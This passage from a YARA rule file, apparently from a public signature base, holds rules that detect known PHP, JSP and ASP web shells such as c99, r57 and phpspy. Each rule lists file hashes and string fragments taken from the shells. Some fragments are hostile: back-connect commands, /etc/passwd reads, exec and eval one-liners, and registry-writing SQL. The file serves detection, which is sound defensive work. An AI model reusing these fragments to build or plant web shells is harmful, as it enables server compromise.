		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "56c005690da2558690c4aa305a31ad37"
		hash3 = "70a0ee2624e5bbe5525ccadc467519f6"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
		hash5 = "6e0fa491d620d4af4b67bae9162844ae"
		hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword
		$s6 = "password = (String)session.getAttribute(\"password\");" fullword
		$s7 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231"
	condition:
		2 of them
}
rule webshell_shell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 60
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
		hash3 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash4 = "40a1f840111996ff7200d18968e42cfe"
		hash5 = "e0202adff532b28ef1ba206cf95962f2"
		hash6 = "802f5cae46d394b297482fd0c27cb2fc"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
	strings:
		$s0 = "$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";" fullword
		$s5 = "while(list($kname, $columns) = @each($index)) {" fullword
		$s6 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";" fullword
		$s9 = "$tabledump .= \"   PRIMARY KEY ($colnames)\";" fullword
		$fn = "filename: backup"
	condition:
		2 of ($s*) and not $fn
}
rule webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "a2516ac6ee41a7cf931cbaef1134a9e4"
		hash1 = "ef43fef943e9df90ddb6257950b3538f"
		hash2 = "ae025c886fbe7f9ed159f49593674832"
		hash3 = "911195a9b7c010f61b66439d9048f400"
		hash4 = "697dae78c040150daff7db751fc0c03c"
		hash5 = "513b7be8bd0595c377283a7c87b44b2e"
		hash6 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash7 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash8 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash9 = "41af6fd253648885c7ad2ed524e0692d"
		hash10 = "6fcc283470465eed4870bcc3e2d7f14d"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC"
	condition:
		all of them
}
rule webshell_itsec_PHPJackal_itsecteam_shell_jHn {
	meta:
		description = "Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
		hash1 = "e2830d3286001d1455479849aacbbb38"
		hash2 = "bd6d3b2763c705a01cc2b3f105a25fa4"
		hash3 = "40c6ecf77253e805ace85f119fe1cebb"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
		$s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|"
		$s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+"
	condition:
		2 of them
}
rule webshell_Shell_ci_Biz_was_here_c100_v_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "f2fa878de03732fbf5c86d656467ff50"
		hash1 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$stri"
		$s3 = "<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\""
		$s4 = "<OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CPUINFO" fullword
		$s7 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/de"
		$s9 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER"
	condition:
		2 of them
}
rule webshell_NIX_REMOTE_WEB_SHELL_NIX_REMOTE_WEB_xxx1 {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "0b19e9de790cd2f4325f8c24b22af540"
		hash1 = "f3ca29b7999643507081caab926e2e74"
		hash2 = "527cf81f9272919bf872007e21c4bdda"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type="
		$s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
		$s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
		$s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword
	condition:
		2 of them
}
rule webshell_c99_c99shell_c99_w4cking_Shell_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "d3f38a6dc54a73d304932d9227a739ec"
		hash2 = "9c34adbc8fd8d908cbb341734830f971"
		hash3 = "f2fa878de03732fbf5c86d656467ff50"
		hash4 = "b8f261a3cdf23398d573aaf55eaf63b5"
		hash5 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash6 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash7 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash8 = "157b4ac3c7ba3a36e546e81e9279eab5"
		hash9 = "048ccc01b873b40d57ce25a4c56ea717"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s0 = "echo \"<b>HEXDUMP:</b><nobr>"
		$s4 = "if ($filestealth) {$stat = stat($d.$f);}" fullword
		$s5 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r"
		$s6 = "if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB "
		$s8 = "echo \"<center><b>Server-status variables:</b><br><br>\";" fullword
		$s9 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>"
	condition:
		2 of them
}
rule webshell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash1 = "aa17b71bb93c6789911bd1c9df834ff9"
		hash2 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash3 = "40a1f840111996ff7200d18968e42cfe"
		hash4 = "e0202adff532b28ef1ba206cf95962f2"
		hash5 = "802f5cae46d394b297482fd0c27cb2fc"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
	strings:
		$s0 = "$this -> addFile($content, $filename);" fullword
		$s3 = "function addFile($data, $name, $time = 0) {" fullword
		$s8 = "function unix2DosTime($unixtime = 0) {" fullword
		$s9 = "foreach($filelist as $filename){" fullword
	condition:
		all of them
}
rule webshell_c99_c66_c99_shadows_mod_c99shell {
	meta:
		description = "Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash3 = "048ccc01b873b40d57ce25a4c56ea717"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s2 = "  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv"
		$s3 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword
		$s4 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66"
		$s7 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources"
		$s8 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos"
		$s9 = "   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!"
	condition:
		2 of them
}
rule webshell_he1p_JspSpy_nogfw_ok_style_1_JspSpy1 {
	meta:
		description = "Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b330a6c2d49124ef0729539761d6ef0b"
		hash1 = "d71716df5042880ef84427acee8b121e"
		hash2 = "344f9073576a066142b2023629539ebd"
		hash3 = "32dea47d9c13f9000c4c807561341bee"
		hash4 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash5 = "3ea688e3439a1f56b16694667938316d"
		hash6 = "2434a7a07cb47ce25b41d30bc291cacc"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword
		$s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?"
		$s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword
		$s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>"
	condition:
		2 of them
}
rule webshell_000_403_c5_config_myxx_queryDong_spyjsp2010_zend {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash4 = "e0354099bee243702eb11df8d0e046df"
		hash5 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash6 = "655722eaa6c646437c8ae93daac46ae0"
		hash7 = "591ca89a25f06cf01e4345f98a22845c"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "return new Double(format.format(value)).doubleValue();" fullword
		$s5 = "File tempF = new File(savePath);" fullword
		$s9 = "if (tempF.isDirectory()) {" fullword
	condition:
		2 of them
}
rule webshell_c99_c99shell_c99_c99shell {
	meta:
		description = "Web Shell - from files c99.php, c99shell.php, c99.php, c99shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "d3f38a6dc54a73d304932d9227a739ec"
		hash2 = "157b4ac3c7ba3a36e546e81e9279eab5"
		hash3 = "048ccc01b873b40d57ce25a4c56ea717"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s2 = "$bindport_pass = \"c99\";" fullword
		$s5 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = tr"
	condition:
		1 of them
}
rule webshell_r57shell127_r57_iFX_r57_kartal_r57_antichat {
	meta:
		description = "Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae025c886fbe7f9ed159f49593674832"
		hash1 = "513b7be8bd0595c377283a7c87b44b2e"
		hash2 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash3 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash4 = "3f71175985848ee46cc13282fbed2269"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d"
		$s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
		$s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
		$s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword
	condition:
		2 of them
}
rule webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "0b19e9de790cd2f4325f8c24b22af540"
		hash1 = "4745d510fed4378e4b1730f56f25e569"
		hash2 = "f3ca29b7999643507081caab926e2e74"
		hash3 = "46a18979750fa458a04343cf58faa9bd"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "BODY, TD, TR {" fullword
		$s5 = "$d=str_replace(\"\\\\\",\"/\",$d);" fullword
		$s6 = "if ($file==\".\" || $file==\"..\") continue;" fullword
	condition:
		2 of them
}
rule webshell_000_403_807_a_c5_config_css_dm_he1p_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash7 = "14e9688c86b454ed48171a9d4f48ace8"
		hash8 = "b330a6c2d49124ef0729539761d6ef0b"
		hash9 = "d71716df5042880ef84427acee8b121e"
		hash10 = "341298482cf90febebb8616426080d1d"
		hash11 = "29aebe333d6332f0ebc2258def94d57e"
		hash12 = "42654af68e5d4ea217e6ece5389eb302"
		hash13 = "88fc87e7c58249a398efd5ceae636073"
		hash14 = "4a812678308475c64132a9b56254edbc"
		hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash16 = "e0354099bee243702eb11df8d0e046df"
		hash17 = "344f9073576a066142b2023629539ebd"
		hash18 = "32dea47d9c13f9000c4c807561341bee"
		hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash20 = "655722eaa6c646437c8ae93daac46ae0"
		hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash22 = "6acc82544be056580c3a1caaa4999956"
		hash23 = "6aa32a6392840e161a018f3907a86968"
		hash24 = "591ca89a25f06cf01e4345f98a22845c"
		hash25 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash26 = "3ea688e3439a1f56b16694667938316d"
		hash27 = "ab77e4d1006259d7cbc15884416ca88c"
		hash28 = "71097537a91fac6b01f46f66ee2d7749"
		hash29 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash30 = "7a4b090619ecce6f7bd838fe5c58554b"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "String savePath = request.getParameter(\"savepath\");" fullword
		$s4 = "URL downUrl = new URL(downFileUrl);" fullword
		$s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
		$s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
		$s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
		$s8 = "URLConnection conn = downUrl.openConnection();" fullword
		$s9 = "sis = request.getInputStream();" fullword
	condition:
		4 of them
}
rule webshell_2_520_icesword_job_ma1 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
		hash3 = "56c005690da2558690c4aa305a31ad37"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
		$s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
		$s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword
	condition:
		2 of them
}
rule webshell_404_data_in_JFolder_jfolder01_jsp_suiyue_warn {
	meta:
		description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash3 = "8979594423b68489024447474d113894"
		hash4 = "ec482fc969d182e5440521c913bab9bd"
		hash5 = "f98d2b33cd777e160d1489afed96de39"
		hash6 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		hash7 = "e9a5280f77537e23da2545306f6a19ad"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol"
		$s2 = " KB </td>" fullword
		$s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\""
		$s4 = "<!-- <tr align=\"center\"> " fullword
	condition:
		all of them
}

rule webshell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_PHPSPY {
	meta:
		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash1 = "42f211cec8032eb0881e87ebdb3d7224"
		hash2 = "40a1f840111996ff7200d18968e42cfe"
		hash3 = "0712e3dc262b4e1f98ed25760b206836"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
	strings:
		$s4 = "http://www.4ngel.net" fullword
		$s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
		$s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
		$s9 = "Codz by Angel" fullword
	condition:
		2 of them
}
rule webshell_c99_locus7s_c99_w4cking_xxx {
	meta:
		description = "Web Shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "38fd7e45f9c11a37463c3ded1c76af4c"
		hash1 = "9c34adbc8fd8d908cbb341734830f971"
		hash2 = "ef43fef943e9df90ddb6257950b3538f"
		hash3 = "ae025c886fbe7f9ed159f49593674832"
		hash4 = "911195a9b7c010f61b66439d9048f400"
		hash5 = "697dae78c040150daff7db751fc0c03c"
		hash6 = "513b7be8bd0595c377283a7c87b44b2e"
		hash7 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash8 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash9 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash10 = "b8f261a3cdf23398d573aaf55eaf63b5"
		hash11 = "0d2c2c151ed839e6bafc7aa9c69be715"
		hash12 = "41af6fd253648885c7ad2ed524e0692d"
		hash13 = "6fcc283470465eed4870bcc3e2d7f14d"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "$res = @shell_exec($cfe);" fullword
		$s8 = "$res = @ob_get_contents();" fullword
		$s9 = "@exec($cfe,$res);" fullword
	condition:
		2 of them
}
rule webshell_browser_201_3_ma_ma2_download {
	meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash4 = "4b45715fa3fa5473640e17f49ef5513d"
		hash5 = "fa87bbd7201021c1aefee6fcc5b8e25a"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
		$s2 = "private static String tempdir = \".\";" fullword
		$s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\""
	condition:
		2 of them
}
rule webshell_000_403_c5_queryDong_spyjsp2010 {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash4 = "655722eaa6c646437c8ae93daac46ae0"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val"
		$s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa"
		$s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName("
		$s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword
	condition:
		2 of them
}
rule webshell_r57shell127_r57_kartal_r57 {
	meta:
		description = "Web Shell - from files r57shell127.php, r57_kartal.php, r57.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae025c886fbe7f9ed159f49593674832"
		hash1 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash2 = "4108f28a9792b50d95f95b9e5314fa1e"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
		$s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
		$s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_"
	condition:
		2 of them
}

rule webshell_webshells_new_con2 {
	meta:
		description = "Web shells - generated from file con2.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "d3584159ab299d546bd77c9654932ae3"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e"
		$s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n"
	condition:
		1 of them
}
rule webshell_webshells_new_make2 {
	meta:
		description = "Web shells - generated from file make2.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		hash = "9af195491101e0816a263c106e4c145e"
		score = 50
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8"
	condition:
		all of them
}
rule webshell_webshells_new_aaa {
	meta:
		description = "Web shells - generated from file aaa.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "68483788ab171a155db5266310c852b2"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\""
		$s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL"
		$s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&"
	condition:
		1 of them
}
rule webshell_Expdoor_com_ASP {
	meta:
		description = "Web shells - generated from file Expdoor.com ASP.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "caef01bb8906d909f24d1fa109ea18a7"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "\">www.Expdoor.com</a>" fullword
		$s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max"
		$s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
		$s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
		$s16 = "<TITLE>Expdoor.com ASP" fullword
	condition:
		2 of them
}
rule webshell_webshells_new_php2 {
	meta:
		description = "Web shells - generated from file php2.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "fbf2e76e6f897f6f42b896c855069276"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<?php $s=@$_GET[2];if(md5($s.$s)=="
	condition:
		all of them
}
rule webshell_bypass_iisuser_p {
	meta:
		description = "Web shells - generated from file bypass-iisuser-p.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "924d294400a64fa888a79316fb3ccd90"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject"
	condition:
		all of them
}
rule webshell_sig_404super {
	meta:
		description = "Web shells - generated from file 404super.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/03/28"
		score = 70
		hash = "7ed63176226f83d36dce47ce82507b28"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
